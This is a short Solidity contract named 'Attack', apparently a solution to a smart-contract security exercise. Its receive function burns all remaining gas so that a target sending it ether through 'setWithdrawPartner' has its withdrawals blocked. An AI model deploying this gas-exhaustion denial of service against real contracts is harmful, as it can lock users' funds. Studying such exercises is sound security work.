//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @dev Deploy this contract, copy address and call setWithdrawPartner with it 
 */
contract Attack {
    receive() external payable {
        while(gasleft() > 0) {
            keccak256(abi.encode(block.prevrandao));
        }
    }
}


















